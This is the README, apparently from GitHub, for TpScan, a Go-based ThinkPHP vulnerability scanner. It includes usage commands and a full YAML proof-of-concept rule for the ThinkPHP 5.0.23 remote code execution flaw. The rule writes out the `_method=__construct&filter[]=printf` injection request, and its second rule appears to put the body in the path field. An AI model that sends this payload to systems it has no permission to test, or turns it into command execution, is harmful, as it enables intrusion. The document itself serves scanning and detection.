![TpScan](https://socialify.git.ci/captain686/TpScan/image?font=Raleway&forks=1&issues=1&language=1&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light)

## ☃️What

使用`golang`编写的ThinkPHP扫描器，`POC`采用`ymal`文件加载

## 🤪How

- 单个`URL`测试

```bash
./TpScan.exe -u http://node4.buuoj.cn:26433/
```

- 批量`URL`测试

```bash
./TpScan.exe -f test.txt
```

## 🤑About

- `Ymal`文件格式

  ```yaml
  name: 5.0.23-Rce
  rules:
    r1:
      request:
        method: POST
        headers:
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        path: /index.php?s=captcha
        body: _method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=randomStr
      expression:
  #      result: and
  #      response_status: 404
        inResponse: |
          randomStr
  
    r2:
      request:
  #支持POST和GET    
        method: POST
        headers:
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        path: _method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=randomStr
        FollowRedirects: true
  #允许302跳转，默认为true
      expression:
  # r2验证结果为 response_status == 404 && inResponse(randomStr)
        result: and
  #      result: or
        response_status: 404
        inResponse: |
          randomStr
  #randomStr为占位符，会被自动替换为10位随机字符
  
  expression:
    r1 || r2
  #  r1 && r2
  #支持逻辑运算
  
  
  # 信息部分
  detail:
    author: Captain686
    links:
      - https://github.com/captain686
  ```
  
  
  
  在`Xray`的`poc`格式基础上进行部分修改
  
  `Poc`文件存放在`User_Exploit`目录下

## 😎ToDo

- [ ] 后续更新`Poc`文件
